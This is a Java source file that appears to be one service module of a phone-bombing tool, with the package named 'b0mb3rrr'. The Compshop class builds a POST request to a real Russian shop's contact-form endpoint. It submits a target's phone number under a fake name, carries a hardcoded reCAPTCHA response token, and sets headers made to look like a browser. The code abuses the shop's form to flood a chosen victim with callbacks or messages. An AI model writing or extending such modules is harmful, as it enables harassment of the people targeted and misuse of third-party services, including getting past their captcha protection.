package me.oneqxz.b0mb3rrr.services.impl;

import me.oneqxz.b0mb3rrr.data.Phone;
import me.oneqxz.b0mb3rrr.services.Service;
import okhttp3.MultipartBody;
import okhttp3.Request;
import okhttp3.RequestBody;

public class Compshop extends Service {
    @Override
    public Request.Builder buildRequest(Phone phone) {
        RequestBody requestBody = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("_wpcf7", "1166")
                .addFormDataPart("_wpcf7_version", "5.5.4")
                .addFormDataPart("_wpcf7_locale", "ru_RU")
                .addFormDataPart("_wpcf7_unit_tag", "wpcf7-f1166-p1141-o2")
                .addFormDataPart("_wpcf7_container_post", "1141")
                .addFormDataPart("_wpcf7_posted_data_hash", "")
                .addFormDataPart("_wpcf7_recaptcha_response", "HFbjF3fUhTKHs1MAFCQBtTQVF8DWQdeUQPPHMVLz86DkQ0LF81ExQgOFdhKGtXLWA9OzthCkIERwRGJxMiBSQWExQiBgAteQ1Fai1CeVBjaXARUCdzEHImVWR9CQJMGzRAfiVFR1tpcz1jVjhUNCIWczduGXMKOmYmfg")
                .addFormDataPart("your-name", this.getFaker().address().firstName())
                .addFormDataPart("tel-587", phone.phone())
                .build();

        return new Request.Builder()
                .url("https://compshop.ru/wp-json/contact-form-7/v1/contact-forms/1166/feedback")
                .post(requestBody)
                .header("Accept", "application/json, */*;q=0.1")
                .header("Accept-Language", "ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3")
                .header("Accept-Encoding", "gzip, deflate, br")
                .header("Referer", "https://compshop.ru/")
                .header("Content-Type", "multipart/form-data; boundary=---------------------------155495496733803509973019374732")
                .header("Origin", "https://compshop.ru")
                .header("Alt-Used", "compshop.ru")
                .header("Connection", "keep-alive")
                .header("Cookie", "marquiz__url_params={}")
                .header("Sec-Fetch-Dest", "empty")
                .header("Sec-Fetch-Mode", "cors")
                .header("Sec-Fetch-Site", "same-origin")
                .header("TE", "trailers");
    }

    @Override
    public String getServiceName() {
        return "Compshop";
    }
}
